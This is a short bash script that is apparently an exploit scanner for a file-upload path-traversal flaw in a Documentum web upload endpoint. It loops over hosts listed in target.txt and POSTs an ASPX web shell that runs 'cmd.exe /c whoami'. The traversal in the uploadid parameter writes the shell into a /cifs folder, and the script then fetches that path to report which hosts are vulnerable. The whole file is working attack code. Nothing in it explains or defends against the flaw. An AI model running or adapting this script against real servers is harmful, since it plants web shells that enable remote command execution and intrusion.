#!/bin/bash

while read -r target; do
    
post_data='<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
    Response.Write("<pre>");
    Response.Write(Server.HtmlEncode(ExcuteCmd()));
    Response.Write("</pre>");
}
string ExcuteCmd()
{
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c whoami";
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    return s;
}
</script>'

    
    response=$(curl -k -s -X POST -H "Content-Type: text/plain" -d "$post_data" "$target/documentum/upload.aspx?parentid=QUFBQUFBQUFBQUFBQUFBi0FBQUFBQUFBQUFBQUFBQUE%3D&raw=1&unzip=on&uploadid=x\\..\\..\\..\\cifs&filename=x.aspx")

    if [[ $response == *"200 OK"* ]]; then
        get_response=$(curl -k -s -o /dev/null -w "%{http_code}" "$target/cifs/x.aspx")
        
        if [[ $get_response == "200" ]]; then
            echo "Vulnerable IP: $target"
        else
            echo "IP $target responded but not vulnerable"
        fi
    else
        echo "IP $target not vulnerable"
    fi
done < target.txt
